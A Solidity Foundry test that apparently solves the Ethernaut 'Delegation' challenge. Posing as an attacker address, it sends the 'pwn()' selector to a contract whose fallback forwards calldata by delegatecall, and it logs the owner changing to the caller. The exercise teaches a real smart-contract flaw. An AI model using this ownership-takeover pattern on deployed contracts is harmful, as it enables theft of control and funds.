// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";

contract DelegationTest is Test {
    function setUp() public {
    }

    function testDelegation() public {
        address attacker = address(0x123);
        bytes memory payload = abi.encodeWithSignature("pwn()");
        Delegate d = new Delegate(address(this));
        console.log("d.owner: %s", d.owner());
        console.log("d.address: %s", address(d));
        Delegation d1 = new Delegation(address(d));
        console.log("d1.owner: %s", d1.owner());
        vm.startPrank(attacker);
        (bool success,) = address(d1).call(payload);
        require(success);
        vm.stopPrank();
        console.log("d1.owner after: %s", d1.owner());
    }
}